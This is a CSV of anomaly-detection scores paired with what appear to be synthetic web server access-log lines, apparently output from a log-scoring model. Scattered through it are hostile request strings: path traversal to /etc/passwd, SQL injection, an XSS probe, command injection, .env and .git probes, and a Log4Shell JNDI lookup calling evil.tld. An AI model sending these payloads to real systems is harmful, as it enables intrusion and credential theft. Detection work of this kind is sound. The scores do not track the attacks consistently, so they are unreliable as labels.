score_content,score_session,score_fused,score_fused_norm,line
93.8865966796875,,93.8865966796875,93.8865966796875,213.163.122.141 - - [10/Jan/2025:12:05:50 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 15813 "-" "curl/7.85.0"
24.08478546142578,,24.08478546142578,24.08478546142578,153.74.48.47 - - [10/Jan/2025:12:05:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 5325 "https://twitter.com/" "nikto/2.5.0"
12.854497909545898,,12.854497909545898,12.854497909545898,2.145.8.216 - - [10/Jan/2025:12:05:53 +0100] "PUT /profile HTTP/1.1" 200 18945 "https://news.ycombinator.com/" "curl/7.85.0"
30195.181640625,,30195.181640625,30195.181640625,52.28.191.116 - - [10/Jan/2025:12:05:53 +0100] "OPTIONS /api/products HTTP/1.1" 401 1 "https://news.ycombinator.com/" "curl/7.85.0"
0.3148283064365387,,0.3148283064365387,0.3148283064365387,84.143.101.90 - - [10/Jan/2025:12:05:56 +0100] "GET /assets/app.js HTTP/1.1" 200 17504 "https://news.ycombinator.com/" "nikto/2.5.0"
68.55962371826172,,68.55962371826172,68.55962371826172,93.202.172.230 - - [10/Jan/2025:12:05:56 +0100] "HEAD /search?q=laptop HTTP/1.1" 201 13311 "https://news.ycombinator.com/" "nikto/2.5.0"
93.85861206054688,,93.85861206054688,93.85861206054688,220.91.44.121 - - [10/Jan/2025:12:05:58 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 201 8060 "https://example.com/" "sqlmap/1.7.2#stable"
47.30463790893555,,47.30463790893555,47.30463790893555,108.47.231.209 - - [10/Jan/2025:12:05:59 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 302 11398 "https://news.ycombinator.com/" "nikto/2.5.0"
71.94566345214844,,71.94566345214844,71.94566345214844,112.205.51.250 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /logout HTTP/1.1" 200 11696 "https://twitter.com/" "nikto/2.5.0"
70.10459899902344,,70.10459899902344,70.10459899902344,11.110.13.212 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14409 "https://www.google.com/" "nikto/2.5.0"
93.79106903076172,,93.79106903076172,93.79106903076172,194.136.91.148 - - [10/Jan/2025:12:06:03 +0100] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 5277 "https://twitter.com/" "nikto/2.5.0"
26.696693420410156,,26.696693420410156,26.696693420410156,55.49.152.227 - - [10/Jan/2025:12:06:03 +0100] "DELETE /api/products HTTP/1.1" 204 3267 "-" "dirb/2.22"
2.6759791374206543,,2.6759791374206543,2.6759791374206543,165.211.121.34 - - [10/Jan/2025:12:06:04 +0100] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2749 "https://www.google.com/" "sqlmap/1.7.2#stable"
5.449956893920898,,5.449956893920898,5.449956893920898,254.229.55.234 - - [10/Jan/2025:12:06:05 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 304 810 "https://news.ycombinator.com/" "python-requests/2.31.0"
30171.73046875,,30171.73046875,30171.73046875,91.89.179.36 - - [10/Jan/2025:12:06:07 +0100] "DELETE /api/product?id=123 HTTP/1.1" 403 1015 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
29.383460998535156,,29.383460998535156,29.383460998535156,250.98.107.170 - - [10/Jan/2025:12:06:10 +0100] "DELETE /dashboard HTTP/1.1" 302 17701 "https://example.com/" "python-requests/2.31.0"
49.216796875,,49.216796875,49.216796875,250.225.214.231 - - [10/Jan/2025:12:06:11 +0100] "HEAD /about HTTP/1.1" 304 7503 "https://twitter.com/" "dirb/2.22"
26.858295440673828,,26.858295440673828,26.858295440673828,197.63.229.253 - - [10/Jan/2025:12:06:13 +0100] "DELETE /admin HTTP/1.1" 200 1418 "-" "curl/7.85.0"
26.794658660888672,,26.794658660888672,26.794658660888672,127.88.32.178 - - [10/Jan/2025:12:06:16 +0100] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9561 "https://example.com/" "curl/7.85.0"
51.44121170043945,,51.44121170043945,51.44121170043945,69.174.98.70 - - [10/Jan/2025:12:06:17 +0100] "DELETE /search?q=laptop HTTP/1.1" 301 8633 "https://example.com/" "python-requests/2.31.0"
25.051849365234375,,25.051849365234375,25.051849365234375,66.35.84.96 - - [10/Jan/2025:12:06:18 +0100] "DELETE /cgi-bin/test.cgi HTTP/1.1" 200 3650 "https://news.ycombinator.com/" "dirb/2.22"
23.977231979370117,,23.977231979370117,23.977231979370117,196.245.226.101 - - [10/Jan/2025:12:06:19 +0100] "GET /search?q=monitor HTTP/1.1" 200 1925 "https://twitter.com/" "curl/7.85.0"
4.635644435882568,,4.635644435882568,4.635644435882568,138.132.26.43 - - [10/Jan/2025:12:06:20 +0100] "POST /about HTTP/1.1" 200 13330 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.0726661682128906,,2.0726661682128906,2.0726661682128906,253.189.52.33 - - [10/Jan/2025:12:06:22 +0100] "GET /about HTTP/1.1" 200 18626 "https://example.com/" "sqlmap/1.7.2#stable"
94.00053405761719,,94.00053405761719,94.00053405761719,251.21.198.168 - - [10/Jan/2025:12:06:24 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 5471 "-" "python-requests/2.31.0"
0.2880122661590576,,0.2880122661590576,0.2880122661590576,154.62.108.30 - - [10/Jan/2025:12:06:24 +0100] "GET /wp-login.php HTTP/1.1" 201 3676 "https://www.google.com/" "nikto/2.5.0"
0.3771817982196808,,0.3771817982196808,0.3771817982196808,14.223.69.199 - - [10/Jan/2025:12:06:24 +0100] "GET /index.html HTTP/1.1" 204 12301 "https://news.ycombinator.com/" "nikto/2.5.0"
30124.232421875,,30124.232421875,30124.232421875,192.17.31.84 - - [10/Jan/2025:12:06:27 +0100] "GET /assets/app.css HTTP/1.1" 404 267 "https://www.google.com/" "nikto/2.5.0"
102.84941101074219,,102.84941101074219,102.84941101074219,82.240.94.191 - - [10/Jan/2025:12:06:27 +0100] "TRACE /server-status HTTP/1.1" 200 19277 "https://www.google.com/" "nikto/2.5.0"
93.98312377929688,,93.98312377929688,93.98312377929688,190.246.140.253 - - [10/Jan/2025:12:06:30 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 16790 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30171.748046875,,30171.748046875,30171.748046875,251.28.133.157 - - [10/Jan/2025:12:06:33 +0100] "DELETE /search?q=camera HTTP/1.1" 404 852 "https://www.google.com/" "curl/7.85.0"
24.058311462402344,,24.058311462402344,24.058311462402344,30.118.145.143 - - [10/Jan/2025:12:06:33 +0100] "GET /search?q=phone HTTP/1.1" 200 11594 "-" "python-requests/2.31.0"
3.1978509426116943,,3.1978509426116943,3.1978509426116943,110.90.19.32 - - [10/Jan/2025:12:06:33 +0100] "POST /.env HTTP/1.1" 200 18978 "https://news.ycombinator.com/" "python-requests/2.31.0"
48.887939453125,,48.887939453125,48.887939453125,138.41.28.179 - - [10/Jan/2025:12:06:36 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 10464 "https://twitter.com/" "python-requests/2.31.0"
1.880642294883728,,1.880642294883728,1.880642294883728,177.150.107.75 - - [10/Jan/2025:12:06:37 +0100] "GET /dashboard HTTP/1.1" 200 4955 "https://twitter.com/" "python-requests/2.31.0"
127.54316711425781,,127.54316711425781,127.54316711425781,72.153.98.59 - - [10/Jan/2025:12:06:38 +0100] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 17302 "https://twitter.com/" "dirb/2.22"
44.90034484863281,,44.90034484863281,44.90034484863281,252.219.169.34 - - [10/Jan/2025:12:06:41 +0100] "HEAD /.git/config HTTP/1.1" 200 8854 "https://twitter.com/" "dirb/2.22"
0.2652568221092224,,0.2652568221092224,0.2652568221092224,208.131.109.50 - - [10/Jan/2025:12:06:43 +0100] "GET /assets/app.js HTTP/1.1" 200 4165 "https://example.com/" "nikto/2.5.0"
48.842796325683594,,48.842796325683594,48.842796325683594,4.44.253.196 - - [10/Jan/2025:12:06:44 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 3073 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30150.09375,,30150.09375,30150.09375,176.212.3.221 - - [10/Jan/2025:12:06:46 +0100] "DELETE /about HTTP/1.1" 403 1480 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.5446548461914,,96.5446548461914,96.5446548461914,210.153.72.135 - - [10/Jan/2025:12:06:47 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 8929 "-" "curl/7.85.0"
101.63359069824219,,101.63359069824219,101.63359069824219,44.5.234.220 - - [10/Jan/2025:12:06:49 +0100] "TRACE /.env HTTP/1.1" 200 4422 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
34.892276763916016,,34.892276763916016,34.892276763916016,247.176.117.195 - - [10/Jan/2025:12:06:52 +0100] "PUT /search?q=laptop HTTP/1.1" 200 9260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.17821502685547,,70.17821502685547,70.17821502685547,240.103.94.143 - - [10/Jan/2025:12:06:52 +0100] "OPTIONS /../../etc/passwd HTTP/1.1" 200 8976 "https://www.google.com/" "sqlmap/1.7.2#stable"
124.9850845336914,,124.9850845336914,124.9850845336914,227.168.233.244 - - [10/Jan/2025:12:06:53 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 14438 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.565222263336182,,4.565222263336182,4.565222263336182,120.62.45.66 - - [10/Jan/2025:12:06:56 +0100] "POST /contact HTTP/1.1" 204 16713 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.13705062866211,,49.13705062866211,49.13705062866211,86.62.105.93 - - [10/Jan/2025:12:06:57 +0100] "HEAD /profile HTTP/1.1" 302 18342 "-" "curl/7.85.0"
34.81532287597656,,34.81532287597656,34.81532287597656,124.227.239.222 - - [10/Jan/2025:12:06:57 +0100] "PUT /search?q=headphones HTTP/1.1" 200 9190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.310995876789093,,0.310995876789093,0.310995876789093,243.147.3.217 - - [10/Jan/2025:12:06:57 +0100] "GET /assets/app.js HTTP/1.1" 200 16220 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.021385192871094,,24.021385192871094,24.021385192871094,198.180.146.73 - - [10/Jan/2025:12:06:58 +0100] "GET /api/product?id=123 HTTP/1.1" 200 3149 "https://example.com/" "dirb/2.22"
0.10566656291484833,,0.10566656291484833,0.10566656291484833,244.177.203.90 - - [10/Jan/2025:12:07:01 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 5070 "-" "nikto/2.5.0"
23.9594783782959,,23.9594783782959,23.9594783782959,158.1.34.204 - - [10/Jan/2025:12:07:03 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 8045 "https://example.com/" "dirb/2.22"
34.89289474487305,,34.89289474487305,34.89289474487305,105.5.159.20 - - [10/Jan/2025:12:07:05 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 5676 "https://www.google.com/" "curl/7.85.0"
125.0940170288086,,125.0940170288086,125.0940170288086,126.241.225.53 - - [10/Jan/2025:12:07:07 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 2301 "https://example.com/" "dirb/2.22"
24.065698623657227,,24.065698623657227,24.065698623657227,3.222.60.230 - - [10/Jan/2025:12:07:10 +0100] "GET /search?q=phone HTTP/1.1" 200 13759 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11071.078125,,11071.078125,11071.078125,195.14.104.47 - - [10/Jan/2025:12:07:12 +0100] "PUT /search?q=headphones HTTP/1.1" 500 423 "https://example.com/" "nikto/2.5.0"
2.9466347694396973,,2.9466347694396973,2.9466347694396973,46.34.55.60 - - [10/Jan/2025:12:07:13 +0100] "GET /assets/app.js HTTP/1.1" 302 16598 "-" "Wget/1.21.2 (linux-gnu)"
0.31700199842453003,,0.31700199842453003,0.31700199842453003,19.142.42.112 - - [10/Jan/2025:12:07:15 +0100] "GET /assets/app.js HTTP/1.1" 200 18256 "https://news.ycombinator.com/" "dirb/2.22"
26.82752799987793,,26.82752799987793,26.82752799987793,141.179.206.15 - - [10/Jan/2025:12:07:18 +0100] "DELETE /profile HTTP/1.1" 200 14517 "https://example.com/" "python-requests/2.31.0"
46.332603454589844,,46.332603454589844,46.332603454589844,195.113.29.205 - - [10/Jan/2025:12:07:19 +0100] "HEAD /server-status HTTP/1.1" 200 12503 "https://news.ycombinator.com/" "dirb/2.22"
71.9207992553711,,71.9207992553711,71.9207992553711,73.116.82.22 - - [10/Jan/2025:12:07:20 +0100] "OPTIONS /logout HTTP/1.1" 200 5235 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.856964111328125,,26.856964111328125,26.856964111328125,60.179.45.179 - - [10/Jan/2025:12:07:21 +0100] "DELETE /login HTTP/1.1" 200 2130 "https://www.google.com/" "sqlmap/1.7.2#stable"
11036.5,,11036.5,11036.5,44.135.147.78 - - [10/Jan/2025:12:07:22 +0100] "GET /index.html HTTP/1.1" 500 757 "https://news.ycombinator.com/" "curl/7.85.0"
125.06946563720703,,125.06946563720703,125.06946563720703,14.109.178.22 - - [10/Jan/2025:12:07:22 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 11900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.91423988342285,,26.91423988342285,26.91423988342285,209.226.222.52 - - [10/Jan/2025:12:07:22 +0100] "DELETE /about HTTP/1.1" 200 18481 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.6040096282959,,26.6040096282959,26.6040096282959,34.97.36.122 - - [10/Jan/2025:12:07:24 +0100] "POST /search?q=monitor HTTP/1.1" 200 12931 "https://twitter.com/" "dirb/2.22"
24.054096221923828,,24.054096221923828,24.054096221923828,232.173.163.171 - - [10/Jan/2025:12:07:27 +0100] "GET /search?q=laptop HTTP/1.1" 200 17524 "https://twitter.com/" "python-requests/2.31.0"
0.39615583419799805,,0.39615583419799805,0.39615583419799805,212.17.234.98 - - [10/Jan/2025:12:07:29 +0100] "GET /index.html HTTP/1.1" 200 16344 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.74095916748047,,68.74095916748047,68.74095916748047,184.214.91.224 - - [10/Jan/2025:12:07:31 +0100] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12452 "https://www.google.com/" "dirb/2.22"
4.520571708679199,,4.520571708679199,4.520571708679199,168.92.17.97 - - [10/Jan/2025:12:07:32 +0100] "POST /profile HTTP/1.1" 200 3090 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.28962191939353943,,0.28962191939353943,0.28962191939353943,184.43.143.172 - - [10/Jan/2025:12:07:32 +0100] "GET /assets/app.css HTTP/1.1" 200 17399 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.1620664596557617,,3.1620664596557617,3.1620664596557617,216.229.1.85 - - [10/Jan/2025:12:07:34 +0100] "POST /.env HTTP/1.1" 200 8299 "-" "nikto/2.5.0"
0.28496548533439636,,0.28496548533439636,0.28496548533439636,64.68.108.163 - - [10/Jan/2025:12:07:34 +0100] "GET /assets/app.css HTTP/1.1" 200 15851 "https://www.google.com/" "curl/7.85.0"
2.939861297607422,,2.939861297607422,2.939861297607422,213.19.100.28 - - [10/Jan/2025:12:07:37 +0100] "POST /.git/config HTTP/1.1" 200 14572 "https://twitter.com/" "curl/7.85.0"
29.368837356567383,,29.368837356567383,29.368837356567383,254.27.190.150 - - [10/Jan/2025:12:07:37 +0100] "DELETE /dashboard HTTP/1.1" 301 19606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
48.79452133178711,,48.79452133178711,48.79452133178711,21.102.246.231 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 10336 "https://example.com/" "sqlmap/1.7.2#stable"
30172.73828125,,30172.73828125,30172.73828125,125.232.214.36 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 429 1305 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.448362350463867,,4.448362350463867,4.448362350463867,223.62.216.243 - - [10/Jan/2025:12:07:40 +0100] "POST /api/products HTTP/1.1" 200 5101 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.057476282119751,,2.057476282119751,2.057476282119751,17.18.172.80 - - [10/Jan/2025:12:07:40 +0100] "GET /login HTTP/1.1" 200 13644 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.498046875,,30147.498046875,30147.498046875,235.191.155.53 - - [10/Jan/2025:12:07:42 +0100] "GET /search?q=headphones HTTP/1.1" 404 304 "-" "curl/7.85.0"
12.832901000976562,,12.832901000976562,12.832901000976562,144.234.101.1 - - [10/Jan/2025:12:07:43 +0100] "PUT /contact HTTP/1.1" 200 11957 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.10293681174516678,,0.10293681174516678,0.10293681174516678,26.117.43.197 - - [10/Jan/2025:12:07:46 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 4450 "https://www.google.com/" "python-requests/2.31.0"
4.555817604064941,,4.555817604064941,4.555817604064941,60.10.206.94 - - [10/Jan/2025:12:07:48 +0100] "POST /logout HTTP/1.1" 200 1464 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
34.90788269042969,,34.90788269042969,34.90788269042969,146.130.145.208 - - [10/Jan/2025:12:07:50 +0100] "PUT /search?q=camera HTTP/1.1" 200 13673 "https://example.com/" "sqlmap/1.7.2#stable"
30171.73828125,,30171.73828125,30171.73828125,217.120.231.136 - - [10/Jan/2025:12:07:52 +0100] "DELETE /search?q=camera HTTP/1.1" 404 1298 "https://news.ycombinator.com/" "dirb/2.22"
30169.71875,,30169.71875,30169.71875,146.20.9.87 - - [10/Jan/2025:12:07:54 +0100] "HEAD /login HTTP/1.1" 403 100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
37.48373794555664,,37.48373794555664,37.48373794555664,198.119.145.110 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/product?id=123 HTTP/1.1" 302 4046 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
37.482093811035156,,37.482093811035156,37.482093811035156,97.39.139.241 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 3569 "https://example.com/" "dirb/2.22"
102.97899627685547,,102.97899627685547,102.97899627685547,184.246.225.176 - - [10/Jan/2025:12:07:59 +0100] "TRACE /profile HTTP/1.1" 200 3327 "https://example.com/" "dirb/2.22"
24.048614501953125,,24.048614501953125,24.048614501953125,163.155.240.86 - - [10/Jan/2025:12:08:00 +0100] "GET /search?q=laptop HTTP/1.1" 200 15687 "https://www.google.com/" "curl/7.85.0"
1.8596394062042236,,1.8596394062042236,1.8596394062042236,133.178.125.94 - - [10/Jan/2025:12:08:03 +0100] "GET /phpmyadmin HTTP/1.1" 204 8869 "https://www.google.com/" "sqlmap/1.7.2#stable"
94.05522155761719,,94.05522155761719,94.05522155761719,85.213.208.15 - - [10/Jan/2025:12:08:03 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17015 "-" "sqlmap/1.7.2#stable"
96.54053497314453,,96.54053497314453,96.54053497314453,16.242.221.193 - - [10/Jan/2025:12:08:04 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 13482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.509014129638672,,26.509014129638672,26.509014129638672,221.106.175.44 - - [10/Jan/2025:12:08:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 301 14812 "https://news.ycombinator.com/" "dirb/2.22"
26.82664680480957,,26.82664680480957,26.82664680480957,188.95.82.106 - - [10/Jan/2025:12:08:04 +0100] "DELETE /contact HTTP/1.1" 204 16236 "https://news.ycombinator.com/" "nikto/2.5.0"
0.28311195969581604,,0.28311195969581604,0.28311195969581604,230.130.197.218 - - [10/Jan/2025:12:08:05 +0100] "GET /assets/app.css HTTP/1.1" 200 15256 "https://news.ycombinator.com/" "nikto/2.5.0"
29.473350524902344,,29.473350524902344,29.473350524902344,182.228.158.70 - - [10/Jan/2025:12:08:08 +0100] "DELETE /contact HTTP/1.1" 304 11749 "https://www.google.com/" "curl/7.85.0"
1.9797765016555786,,1.9797765016555786,1.9797765016555786,149.224.246.61 - - [10/Jan/2025:12:08:08 +0100] "GET /contact HTTP/1.1" 200 293 "https://example.com/" "nikto/2.5.0"
45.171077728271484,,45.171077728271484,45.171077728271484,94.143.137.89 - - [10/Jan/2025:12:08:10 +0100] "HEAD /.env HTTP/1.1" 204 18961 "-" "dirb/2.22"
96.56021118164062,,96.56021118164062,96.56021118164062,77.75.44.144 - - [10/Jan/2025:12:08:10 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 304 8144 "-" "Wget/1.21.2 (linux-gnu)"
2.027657985687256,,2.027657985687256,2.027657985687256,240.218.25.128 - - [10/Jan/2025:12:08:12 +0100] "GET /logout HTTP/1.1" 200 16313 "https://news.ycombinator.com/" "curl/7.85.0"
2.8844239711761475,,2.8844239711761475,2.8844239711761475,36.102.175.159 - - [10/Jan/2025:12:08:12 +0100] "GET /assets/app.css HTTP/1.1" 301 11274 "https://www.google.com/" "dirb/2.22"
12.879748344421387,,12.879748344421387,12.879748344421387,193.88.154.82 - - [10/Jan/2025:12:08:12 +0100] "PUT /about HTTP/1.1" 201 5306 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
51.462154388427734,,51.462154388427734,51.462154388427734,74.56.170.243 - - [10/Jan/2025:12:08:12 +0100] "DELETE /search?q=router HTTP/1.1" 302 8972 "https://news.ycombinator.com/" "dirb/2.22"
15.459148406982422,,15.459148406982422,15.459148406982422,205.238.34.33 - - [10/Jan/2025:12:08:14 +0100] "PUT /logout HTTP/1.1" 301 9605 "https://example.com/" "python-requests/2.31.0"
2.2594571113586426,,2.2594571113586426,2.2594571113586426,152.48.25.184 - - [10/Jan/2025:12:08:17 +0100] "GET / HTTP/1.1" 204 11180 "https://twitter.com/" "dirb/2.22"
37.54091262817383,,37.54091262817383,37.54091262817383,131.175.60.114 - - [10/Jan/2025:12:08:18 +0100] "PUT /api/product?id=123 HTTP/1.1" 304 8504 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.67823028564453,,127.67823028564453,127.67823028564453,24.121.37.156 - - [10/Jan/2025:12:08:18 +0100] "TRACE /api/product?id=123 HTTP/1.1" 301 18891 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.14997273683547974,,0.14997273683547974,0.14997273683547974,121.116.95.241 - - [10/Jan/2025:12:08:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17051 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.40313005447387695,,0.40313005447387695,0.40313005447387695,10.87.150.237 - - [10/Jan/2025:12:08:22 +0100] "GET /index.html HTTP/1.1" 200 18730 "https://www.google.com/" "dirb/2.22"
30169.73046875,,30169.73046875,30169.73046875,88.76.35.102 - - [10/Jan/2025:12:08:24 +0100] "HEAD /admin HTTP/1.1" 400 24 "https://www.google.com/" "dirb/2.22"
46.43144989013672,,46.43144989013672,46.43144989013672,86.180.251.188 - - [10/Jan/2025:12:08:24 +0100] "HEAD /api/products HTTP/1.1" 200 11431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.95917320251465,,23.95917320251465,23.95917320251465,62.84.9.253 - - [10/Jan/2025:12:08:24 +0100] "GET /search?q=headphones HTTP/1.1" 200 11605 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.889852523803711,,12.889852523803711,12.889852523803711,213.145.55.33 - - [10/Jan/2025:12:08:27 +0100] "PUT /about HTTP/1.1" 200 546 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.35603976249694824,,0.35603976249694824,0.35603976249694824,75.77.52.175 - - [10/Jan/2025:12:08:27 +0100] "GET /index.html HTTP/1.1" 200 5530 "https://www.google.com/" "sqlmap/1.7.2#stable"
30126.03125,,30126.03125,30126.03125,80.184.3.204 - - [10/Jan/2025:12:08:30 +0100] "GET / HTTP/1.1" 403 1227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.93295288085938,,93.93295288085938,93.93295288085938,229.29.14.142 - - [10/Jan/2025:12:08:30 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 7193 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.4381585121154785,,4.4381585121154785,4.4381585121154785,119.120.172.57 - - [10/Jan/2025:12:08:33 +0100] "POST /api/products HTTP/1.1" 200 2296 "-" "sqlmap/1.7.2#stable"
2.89451003074646,,2.89451003074646,2.89451003074646,87.232.4.195 - - [10/Jan/2025:12:08:36 +0100] "POST /.git/config HTTP/1.1" 200 2860 "https://twitter.com/" "nikto/2.5.0"
2.9063334465026855,,2.9063334465026855,2.9063334465026855,227.43.167.139 - - [10/Jan/2025:12:08:39 +0100] "GET /assets/app.css HTTP/1.1" 302 11841 "https://example.com/" "curl/7.85.0"
93.89682006835938,,93.89682006835938,93.89682006835938,174.99.79.23 - - [10/Jan/2025:12:08:42 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 19502 "https://example.com/" "dirb/2.22"
15.473305702209473,,15.473305702209473,15.473305702209473,19.135.120.132 - - [10/Jan/2025:12:08:43 +0100] "PUT /logout HTTP/1.1" 301 13673 "https://www.google.com/" "curl/7.85.0"
30157.85546875,,30157.85546875,30157.85546875,205.190.106.32 - - [10/Jan/2025:12:08:43 +0100] "PUT /search?q=camera HTTP/1.1" 401 853 "https://example.com/" "sqlmap/1.7.2#stable"
